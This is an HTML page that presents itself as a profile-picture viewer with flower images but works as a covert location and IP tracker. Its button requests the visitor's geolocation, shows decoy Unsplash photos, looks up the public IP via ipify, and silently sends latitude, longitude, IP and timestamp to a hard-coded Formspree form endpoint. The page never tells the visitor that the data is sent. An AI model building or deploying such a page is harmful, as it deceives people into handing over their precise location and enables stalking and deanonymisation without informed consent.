<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Geolocation Test</title>
    <style>
        .flower-container {
            display: flex;
            gap: 15px;
            margin-top: 20px;
        }
        .flower-container img {
            width: 300px;
            height: auto;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>

    <button onclick="findMe()">View from Profile picture</button>
    <div id="result">Here you go.</div>
    
    <div id="gallery" class="flower-container"></div>

    <script>
    function findMe() {
        if (!navigator.geolocation) {
            document.getElementById('result').textContent = "Not supported by your browser.";
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;

                document.getElementById('result').innerHTML = `Lat: ${lat} <br> Lon: ${lon}`;
                
                document.getElementById('gallery').innerHTML = `
                    <img src="https://images.unsplash.com/photo-1501004318641-b39e6451bec6" alt="Pink Flowers">
                    <img src="https://images.unsplash.com/photo-1509042239860-f550ce710b93" alt="Yellow Flowers">
                `;

                // Correct IPify API
                fetch("https://api.ipify.org?format=json")
                    .then(ipRes => ipRes.json())
                    .then(ipData => {
                        sendToFormspree(lat, lon, ipData.ip);
                    })
                    .catch(err => {
                        sendToFormspree(lat, lon, "IP Lookup Blocked");
                    });
            },
            (error) => {
                document.getElementById('result').textContent = `Error: ${error.message}`;
            }
        );
    }

    function sendToFormspree(latitude, longitude, ipAddress) {
        const targetUrl = "https://formspree.io/f/mjgqwonp";

        fetch(targetUrl, {
            method: "POST",
            headers: { 
                "Accept": "application/json",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                Visitor_IP: ipAddress,
                Latitude: latitude,
                Longitude: longitude,
                Timestamp: new Date().toISOString()
            })
        })
        .then(response => {
            if (response.ok) {
                console.log("Transmission successful.");
            } else {
                console.error("Formspree error:", response.status);
            }
        })
        .catch(error => console.error("Formspree connection error:", error));
    }
    </script>
</body>
